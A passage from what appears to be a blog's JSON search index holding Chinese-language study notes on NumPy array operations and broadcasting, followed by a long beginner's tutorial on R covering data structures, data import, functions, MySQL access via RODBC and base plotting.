深度叠加 arr_dstack = np.dstack((b,c)) print(arr_dstack.shape) arr_dstack ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:7:2","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"数组拆分 跟数组的叠加类似，数组的拆分可以分为横向拆分、纵向拆分以及深度拆分。 涉及的函数为： hsplit() 沿横向轴拆分(axis=1) vsplit() 沿axis=0方向 dsplit() split() ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:7:3","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"numpy常用统计函数 注意函数在使用时需要指定axis轴的方向，若不指定，默认统计整个数组 np.sum()，返回求和 np.mean()，返回均值 np.max()，返回最大值 np.min()，返回最小值 np.ptp()，数组沿指定轴返回最大值减去最小值，即（max-min） np.std()，返回标准偏差（standard deviation） np.var()，返回方差（variance） np.cumsum()，返回累加值 np.cumprod()，返回累乘积值 举例： import numpy as np x = np.arange(30).reshape(3, 10) print(x) print(np.max(x)) # 返回整个数组的最大值 print(np.max(x, axis=1)) # 沿axis=1轴方向统计 最大值 输出：[ 9 19 29] ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:8:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"数组的广播 当数组跟一个标量进行数学运算时，标量需要根据数组的形状进行扩展，然后执行运算。这个扩展的过程称为广播（broadcasting） import numpy as np arr = np.arange(6).reshape((2,3)) print(arr) print(arr + 2) ① 广播是numpy对不同形状的数组进行数值计算的方式。 ② 如果两个数组a和b形状相同，即满足 a.shape == b.shape,那么 a*b的结果就是 a与b数组对应位相乘。这要求维数相同，且各维度的长度相同。 ③ 广播就是 a.shape != b.shape，但是数组a和b能进行运算，数组a通过广播与数组b兼容。 ④ 数组a和b能进行运算有两点情况： \\1. 要么两个数组的维度相同。 \\2. 要么先比较最右边维度，看是否有一个为1，为1再看左边两个数组的维度是否相同或者为1。 ⑤ 多个维度，只看最短的维度是否触发广播机制 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:9:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"参考 https://blog.csdn.net/perfectzxiny/article/details/115055241?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.pc_relevant_paycolumn_v3\u0026spm=1001.2101.3001.4242.1\u0026utm_relevant_index=3 https://www.zhihu.com/question/433331468/answer/1611695850 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:10:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["科研"],"content":"https://www.bilibili.com/video/BV1zu411C7ko/ ","date":"2022-04-15","objectID":"/citespace%E5%AD%A6%E4%B9%A0/:0:0","tags":["CiteSpace","文献可视化"],"title":"CiteSpace学习","uri":"/citespace%E5%AD%A6%E4%B9%A0/"},{"categories":["R语言"],"content":"R语言起源 R语言由新西兰奥克兰大学Ross Ihaka和Ribert Gentlenman两人共同发明，其词法和语法分别源自Scheme和S语言。 R定义：一个能够自由有效地用于统计计算和绘图的语言和环境，它提供了广泛的统计分析和绘图技术。 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R语言的优势 免费开源 全面的统计研究平台，提供各种各专业的数据分析技术 是一个程序设计语言，所以他的能力很容易通过使用用户定义的函数扩展 拥有顶尖水准的制图功能 开源从多个数据源获取数据并将其转换为可用的形式 可运行在多种平台上 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的学习资源 R的主页 ：http://www.r-project.org CRAN：http://cran.r-project.org R的博客(推荐多逛逛)：http://www.r-bloggers.com R的数据：《数据挖掘与R语言》、《R语言实战》 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的安装 下载： 进入R的主页http://www.r-project.org，找到download，选择一个镜像进入，然后选择适合自己电脑的版本进行下载 2.安装： 默认安装即可 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的基本使用/常用命令 变量是区分大小写的 r的赋值符号可以为=或者\u003c-（更常用后者） a \u003c- 3 # 把3赋值给a b \u003c\u003c- 2 # 强制赋值给全局变量b s \u003c- sum(1,2,3,4) m \u003c- mean(1,2,3,4) m1 \u003c- max(1,5,2,3) 查看和删除对象： # 查看 ls() #查看当前工作空间中已经使用的变量、函数等对象 ls.str() #列出全部及详细信息 ls(all.names = TRUE) #查看包含隐藏变量、函数等的全部对象 # 查看变量长度 length(a) # 查看变量类型 mode(v) # 删除对象 # 常量、变量、函数等都可以称为对象 rm(a) #删除一个对象a(以节约空间) rm(b,c) #删除多个对象b,c,... rm(list = ls()) #删除所有对象 #查看命令com的变量格式 args(com) 向量的操作： # 求q中所有元素分别的平方根 y \u003c- sqrt(a) z \u003c- a + a2 # 元素相加，长度不一致---\u003e使得较短的向量不断重复循环 # 生成1到1000的向量 x \u003c- 1:1000 # 生成序列,从1到20增量为3 seq(1,20,3) # 生成向量，值为5，循环10次 rep(5,15) rep(1:3, 3) # 1-3的序列，循环三次 x = rep(v, each = n) #依次对向量v的每个元素复制n此生成新的向量x。 # 生成10个服从均值为0，标准差为1的向量 rnorm(10) # 生成服从正态分布的6个均值为5，标准差为2的向量 rnorm(6, mean=5, sd=2) # 取出大于0的 x \u003c- c(0, -3, 4, -1, 45, 98, 12) x[x\u003e0] x[x\u003e=2 | x\u003c5] # 取小于5，大于等于2的 x[-5] # 不取第五个值 x[-(1:3)] # 不取第1-3元素 x = round(v) #生成一个向量x，其中每个元素是v对应元素的最近整数。 \u003e order(x) #获得向量x第i大元素在向量中的位置。 \u003e rank(x) #获得向量x每个元素大小位置。 \u003e sort(x) #对向量x从小到大进行排序。降序：sort(x, decreasing = TRUE)。 \u003e tapply(x,f,g) #根据因子f对向量x分类执行函数g。 \u003e split(x,f) #向量x按因子f分类。 \u003e diff(x) #返回向量x的差分向量。 \u003e cumsum(x) #返回向量x的累加向量。 查看历史命令： # 查看敲过的命令（默认保存在当前系统用户的.history文件里，我们也可以设置保存的其文件） history history(10) #显示最近执行的10条命令 #请空Console窗口：ctrl+L 与逻辑型数据有关的基本操作: is.data.frame(x) #判断是否对象x是数据框。类似命令有is.ts(x)，is.numeric(x)等。 \u003e all(x\u003ea) #判断是否对象x的每个元素都大于a。 \u003e any(x\u003ea) #判断对象x的元素中是否存在一个大于a。 \u003e x\u003ey #判断x的每个元素是否大于y的每个元素。 \u003e x[x\u003ea] #向量x中大于a的元素组成的新向量。 \u003e subset(x, x\u003ea) #向量x中大于a的元素组成的新向量。与上面例子的区别在于若向量元素里有NA，上面的例子会保留在结果中，而subset命令会剔除掉。 \u003e which(x, x\u003ea) #返回向量中大于a的元素的位置。 \u003e x = ifelse(b, u, v) #生成一个与b(逻辑向量)维度相同的数值向量，若b[i]为TRUE，则x[i]为u，反之为v 一个简单例子： age \u003c- c(1,3,5,2,11,9,3,9,12,3) weight \u003c- c(4.4,5.3,7.2,5.2,8.5,7.3,6.0,10.4,10.2,6.1) #mean求平均值,sd求标准差 mean(weight) sd(weight) #查看关系，可以得到相关度 cor(age,weight) #也可以用plot画图来说明 plot(age,weight) # 查看R可以画的图 demo() demo(graphics) 查看帮助文档： # 查看帮助文档 help.start() # 打开帮助文档的首页 help(\"mean\") # 查看某一命令的用法，mean{base}意思是mean属于base包 help(package=\"base\") # 查看包的信息 ?mean # 同上 **R的工作空间：是当前所有的变量都存放的位置 建议养成习惯：给每个项目单独设置一个工作空间 # 查看工作空间 getwd() # 设置新的工作空间 setwd(dir=\"d://RProject/test1\") list.files() #查看当前工作目录下的文件 dir() #查看当前工作目录下的文件 save.image() #保存工作空间，防止断电等外部因素 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R包的使用 R的包(package)可以从：http://cran.r.project.org/web/packages下载。 R自带了一系列默认包（base、datasets、grephics、methods等） 包的使用： #列出已安装的包。 library() # 安装新的包 install.packages(\"car\") # 查看包的信息 help(package=\"car\") # 使用包---\u003e需要先再入，有下面两种方式 library(ggplot) require(ggplot) # 更新包 update.packages() library(help = AER) #获取包AER的信息。 detach(package:zoo) #去除载入的包zoo。 search(reshape) #列出已载入的包。 一般对象的基本操作： objects() ls() #列出所有对象 mode(x) #查看对象x的模式：空，数值，字符，逻辑，复数，列表，函数(NULL，numeric，character，logical，complex，list，function)。 class(x) #查看对象x的类型：除了mode里列出的几种类型外，还有整数，矩阵，因子，阵列，数据框，时间序列(integer，matrix，factor，array，data frame，ts)等其他类型。mode主要用于区别数据存放的方式，而class是一种更细微的分类方式，比如矩阵，就是一种更“有序”的数据存放方式。此命令比mode常用 \u003e as.matrix(x) #把对象x转为矩阵型。 \u003e as.numeric(x) #把对象x转为数值型。 \u003eas.factor(x) #把对象x转化为因子型。 \u003e str(x) #查看对象x的结构。str是structure的缩写。 \u003e rm(x) #移除对象x。 \u003e rm(list=ls(all=TRUE)) #移除所有对象。 \u003ehead(x) #查看数据的前x行 结果的重用： #如下场景 # head 查看 head(mtcars) # lm是线性回归 lm(mpg~wt, data=mtcars) # 我们通常使用变量来保存,实现了重用： result \u003c- lm(mpg~wt, data=mtcars) # summary查看 summary(result) #然后就可以用来进一步分析和使用了 # predict预测回归的值 predict(result, mynewdata) R如何处理大数据集： r的运算都是基于内存的，但是对于很大的数据运算显然是不合适的： R有专门用于大数据的分析报告，如lm()是做线性拟合的函数，而biglm()则能以内存搞笑的方式实现大型数据的线性模型拟合 R与大数据处理平台的结合，如RHadoop、RHive、RHipe等 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"数据集 按照某种格式来创建数据集，是任何数据分析的第一步： 选择一种数据结构来存储 将数据输入或导入这个数据结构中 向R中导入数据有很多方便的方法，可以手工输入数据，也可以从外部源导入数据，数据源可以是电子表格、文本文件、统计软件(SAS)和各类数据库等 数据集通常由数据构成的一个矩形数组，行表示记录，列表示属性(字段)。 R拥有许多用于存储数据的对象类型，包括向量、矩阵、数组、数据框和列表，这些数据结构在存储数据的类型、创建方式、定位和访问我中个别元素的方法等方面都有所不同。 列表：向量、矩阵、数组、数据库、列表 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"向量： 只能包括一种数据类型 # 向量 a \u003c- c(1,3,5,7,-5) a2 \u003c- c(\"one\", \"two\", \"three\") a3 \u003c- c(1,2,6,\"three\") # 都强制转换变成字符串了 # 访问向量中元素 a2[2] a[1:3] a[c(1,3,4)] # 修改元素值（R语言可以对变量中每一个元素直接进行操作） a2[2] \u003c- \"four\" # 求q中所有元素分别的平方根 y \u003c- sqrt(a) z \u003c- a + a2 # 元素相加，长度不一致---\u003e使得较短的向量不断重复循环 # 生成1到1000的向量 x \u003c- 1:1000 # 生成序列,从1到20增量为3 seq(1,20,3) ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:1","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"矩阵： 只能包括一种数据类型，二维的 ?matrix # 查看矩阵的用法 ## 创建矩阵 y = matrix(5:24,nrow=4,ncol=5) # 默认按列填充 ## 创建矩阵 x=c(2,4,6,8) rowname \u003c- c(\"R1\", \"R2\") colname \u003c- c(\"C1\", \"C2\") newMymatrix \u003c- matrix(x, nrow=2,ncol=2,byrow=TRUE,dimnames=list(rowname,colname)) # 按行填充 newMymatrix2 \u003c- matrix(x, nrow=2,ncol=2,dimnames=list(rowname,colname)) # 按列填充 # 通过下标进行元素选择 newMymatrix2[1,] # 访问第一行 newMymatrix2[1,3] # 访问第一行第三个元素 newMymatrix2[,3] # 访问三列 M = rbind(X,Y) #按行合并矩阵X和Y形成新矩阵M。(X和Y列数需相同） M = cbind(X,Y) #按列合并矩阵X和Y形成新矩阵M。(X和Y行数需相同） diag(M) #矩阵M的对角线元素形成的向量 #求矩阵M的特征值和特征向量。 eigen(M)$val eigen(M)$vec ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:2","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"数组： 维度是可以大于2的，元素也只能是一种类型的 ?array # 先确定维度的名字，3x2x4的 dim1 \u003c- c(\"A1\", \"A2\", \"A3\") dim2 \u003c- c(\"B1\", \"B2\") dim3 \u003c- c(\"C1\", \"C2\", \"C3\", \"C4\") # 创建数组，参数：数据,维度,维度名字 d \u003c- array(1:24, c(3,2,4), dimname=list(dim1.dim2,dim3)) #选取元素 d[1,2,3] # 选取第一行，第二列，第三个 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:3","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"数据框 可以存储多种类型的数据 数据框会是我们以后更经常遇到的一种结构 # 创建数据框 data \u003c- data.frame(col1, col2, ...) #例子： id \u003c- c(1,2,3,4) age \u003c- c(25,34,28,52) itype \u003c- c(\"Type1\",\"Type2\",\"Type3\",\"Type2\") status \u003c- c(\"poor\", \"Improved\", \"Excellent\", \"poor\") #下面 创建病例数据的数据框 patientsData \u003c- dada.frame(id, age, itype, status) #取数据 patientsData[1:2] # 取第一列和第二列 patientsData[c(\"itype\", \"status\")] # 根据列名取值 patientsData$age # 使用$来取值 # attach函数将数据框加入搜索路径，以后直接输入列名来取值 attach(mtcars) mgp detach(mtchar) # 从搜索路径移出 # with()函数功能同attach with(mtcars, { ll \u003c- mpg ll }) fix(Data) #编辑数据框Data ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:4","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"因子 itype \u003c- c(\"Type1\",\"Type2\",\"Type3\",\"Type2\") # factor将factor以数组形式存储，将Type1和1联系起来，将Type2和2联系起来 itype \u003c- factor(itype) 待查资料 https://www.runoob.com/r/r-factor.html ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:5","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"列表 是较复杂的数据类型 # myLi \u003c- list(object1, object2, ...) g \u003c- \"First list\" h \u003c- c(23,45,66,997) j \u003c- matrix(1:10, nrow=2) k \u003c- c(\"one\", \"two\", \"three\") # 创建列表 myList \u003c- list(g, h, j, k) # 将前面4个对象将入list # 访问list中元素（和其他数据类型有区别） myList[[2]] # 用双重括号。这里表示取第二个对象 # 创建一个列表 myLi \u003c- list(stu.id=1234, stud.name=\"Tom\", stud.marks=\"12,3,14,25,66\") # 获取第一个元素 [[]] 获取值 myLi[[1]] mode(myLi[[1]]) # [] 单括号 获取第一个成分的\"键值\",即子列表 myLi[1] mode(myLi[1]) myLi$stud.id # names 获取list中的“键” names(myLi) names(myLi) \u003c- c(\"idid\", \"name\", \"marks\") # 可以修改 #去掉列表L里的对象名 unname(L) # 扩充元素 myLi$parents \u003c- c(\"Mom1\", \"Baba1\") length(myLi) # 删减成分 myLi \u003c- myLi[-4] # 删除第四个成分 # 合并列表 other \u003c- list(age=19, gender=\"male\") lst \u003c- c(myLi, other) # unlist变列表中元素为向量的形式 unlist(lst) # 每个向量都有一个名称 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:6","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的数据源导入的方法 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"可导入的数据源： 1.键盘输入 #(实现保存)。不使用edit的话只是一个中间变量，关闭后会消失 # 使用edit mydata \u003c- edit(mydata) # 使用fix（更简洁） fix(mydata) 2.从文本文件导入 r默认只能读取ascii编码的(ANSI)，utf8等会有问题 文本文件的格式每行字段间用逗号隔开的 使用read.table()读取 # 参数：txt位置，header为True会吧文件首行取下来作为标签，sep指定间隔符 data \u003c- read.table(\"f:/data/q.txt\",header=True,sep=\",\") # 路径不要有中文 head(data) # 查看数据 3.导入Excel数据 导入excel数据方式很多(如)，但比较复杂，这里选择简便的方式：另存excel文件类型选择csv，并以逗号分隔，再read.csv() 目的是读入数据的结果，不在乎手段，所以越简单越好 4. …… ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:1","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"用户自定义的函数 格式： myFUnction \u003c- function(arg1, arg2, ...){ statements return(obj) } 实例1：获取系统时间，指定格式并输入 # 定义了一个函数 # switch，如果形参type值为long，执行对应部分 mydate \u003c- function(type){ switch(type, long = format(Sys.time(), \"%A %B %d %Y\"), short = format(Sys.time(), \"%m-%d-%y\"), cat(type, \"is not reccongnized type\\n\") ) } # 调用 mydate(\"long\") mydate(\"short\") 实例2：求1….n的和 sum \u003c- function(num){ for(i in 1:num){ x \u003c- x + i } return(x) } fix(sum) # 会进入编辑器中，打开后给x赋初值：在for循环前 x \u003c- 0 # 调用 sum(10) ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:9:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R访问MySQL数据库 准备工作步骤： 安装RODBC包：install.packages(\"RODBC\") 在http://dev.mysql.com/downloads/connector/odbc 下载connectors ODBC（选择适合自己系统的），然后安装 windows：控制面板-\u003e管理工具-\u003e数据源(ODBC)-\u003e双击-\u003e添加-\u003e选中mysql ODBC driver–\u003e输入数据库信息 使用： #加载库 library(RODBC) myconn \u003c- odbcConnect(\"RData\", uid=\"root\", pwd=\"123456\") # 数据库名，用户名，密码 # 导入mysql数据到r中 data1 \u003c- sqlFetch(myconn, \"news\") # 指定数据表 # 导入查询到的数据到r中 data2 \u003c- sqlQuery(myconn, \"select id,title,pubtime feom news\") # 关闭连接 close(myconn) ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:10:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的集成开发环境(IDE) - RStudio RStudio使用C++开发，界面更加友好，功能更加强大。 我们先下载R，然后去官网下载免费版RStudio即可。 使用： ctrl+s保存为.R结尾的文件 run： 画图： 会在右下角plot显示，还可以对图进行导出保存 History： R程序和默认工作空间： Tools–\u003eoption–\u003eGeneral-\u003e R version 和Default working directory 导入/保存工作空间： Session -\u003e load / save workspace 新建/打开工程： Project下面 导入数据集： Tools –\u003e Import Dataset ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"如何画图 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:12:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"简单的图画例子 数据集： 画图： dose = c(20,30,40,45,60) drugA = c(16,20,27,40,60) drugB = c(15,18,25,31,40) plot(dose, drugA, type = \"b\") #b表示既绘制点也绘制线 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:12:1","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"图形参数的修改 线条、符号、颜色： # par opar = par(no.readonly=TRUE) # 生成的图形就可以进行修改了 # 进行修改 par(lty=2, pch=17) # 虚线和三角形 # 再继续画图 plot(dose, drugA, type = \"b\") # 恢复最开始修改之前的图形 par(opar) # 指定符号和线条，使用较多 plot(dose, drugA, type = \"b\", lty=6, pch=19, lwd=3, cex=2) help(plot) # 但并不是全部绘图函数都支持这个参数，可以先查看绘图函数都支持啥参数 # 指定颜色 colors()返回所有颜色的名称 #col = \"#FFFFF\" #col = \"red\" col = rgb(25,155,60) ... plot(dose, drugA, type = \"b\", lty=6, pch=19, col=\"blue\", col.axis=\"red\", col.lab=\"green\") 文本属性 dose = c(20,30,40,45,60) drugA = c(16,20,27,40,60) drugB = c(15,18,25,31,40) #opar = par(no.readonly=TRUE) #par(lty=2, pch=17) plot(dose, drugA, type = \"b\", font.lab=3, cex.lab=1.5, font.main=2) # 标题的样式为2倍，字体为斜体， # 查看pdf能用的字体 names(pdfFonts()) 图形、边界尺寸 #opar = par(no.readonly=TRUE) #par(pin=c(4,3), mai=c(1,.5,1,.2)) # 4英寸宽，3英寸高；边界为下1左0.5上1右0.2英寸 #plot(dose, drugA, type = \"b\", lty=2, col=\"red\",bg=\"green\") # 添加标题和坐标轴 plot(dose, drugA, type = \"b\", lty=2, col=\"red\",bg=\"green\", main=\"药物A的反应曲线\", sub=\"一个测试数据\", xlab=\"剂量\",ylab=\"病人的反应\",xlim=c(0,60),ylim=c(0,70)) # xlim是横坐标的刻度 # 或者用title 函数来调价标题 title(main=\"我的标题\", col.main=\"red\") title(sub=\"我的副标题\", col.sub=\"green\") 自定义坐标轴 #plot(dose, drugA, type = \"b\",pch=12,col=\"red\",mar=c(5,4,4,8)+0.1, yaxt=\"n\", ann=FALSE) # mar是边界, yaxt=\"n\"禁用y轴刻度, ann=FALSE不会出现坐标轴默认的描述# 设置自己的参数 y = c(1,10) x = y z = 10/x opar = par(no.readonly=TRUE) par(mar=c(5,4,4,8)+0.1) plot(x,y, type = \"b\",pch=12,col=\"red\", yaxt=\"n\", lty=3,ann=FALSE) axis(2, at=y, labels=x, col.axis=\"blue\", las=2) # 2表示在左边添加刻度, las=2表示垂直与坐标轴,at表示刻度线的位置，col.axis坐标轴颜色 # lines和plot差不多，不过是在原来图像上画一条线 lines(x,z,type = \"b\",pch=12,col=\"green\", lty=2) # 4表示在右边添加刻度 axis(4, at=z,labels=round(z,digits=2), col.axis=\"black\", las=2,cex.axis=.7) 次要刻度线 # 1.先下载并导入包 install.packages(\"Hmisc\") library(Hmisc) # 使用 #以下面数据为例 plot(1:4, 1:4, type=\"b\") minor.tick(nx=2,ny=3,tick.ratio=0.5) # x轴分为几段，y轴分为几段，强度 参考线 # abline(h=value, v=value) h为水平线，v为垂直线 abline(h=2, col=\"red\", lty=2) # 在水平第二个位置添加水平线 abline(v=2.5, col=\"red\", lty=1) 图例 opar = par(no.readonly=TRUE) par(lwd=2, cex=1.5, font.lab=2) #药物A的 plot(dose, drugA, type=\"b\",pch=15,col=\"red\",lty=1, ylim=c(0,60), main=\"药物A和药物B的对比\", xlab=\"剂量\", ylab=\"药物反应\") #药物B的，在原来图的基上画 lines(dose, drugB, type=\"b\",pch=17,col=\"blue\",lty=2) #更改刻度 minor.tick(nx=5,ny=2,tick.ratio=0.5) #图例 legend(\"topleft\", inset=.05, title=\"类型\", legend(\"A\",\"B\"), lty=c(1,2),pch=c(15,17),col=c(\"red\",\"blue\")) # 顺序要和前面一样,lty是线的类型,pch是点符号的类型,col是颜色 文本标注 想针对某个点进行标注的时候 attach(mtcars) plot(wt,mpg, main=\"车重和油耗关系\", xlab=\"车重\", xlab=\"油耗\", pth=18,col=\"blue\") text(wt,mpg,row.names(mcars),cex=0.5, pos=4, col=\"red\") 图形组合、图形布局的精细控制 图形组合： attach(mtcars) opar \u003c- par(no.readonly=TRUE) # 设置为两行两列 par(mfrow=c(2,2)) #画第1个图 plot(wt,mpg,main=\"wt vs mpg\") #画第2个图 plot(wt,disp,main=\"wt vs disp\") #画第3个图 hist(wt,main=\"Histogram of wt\") #画第4个图 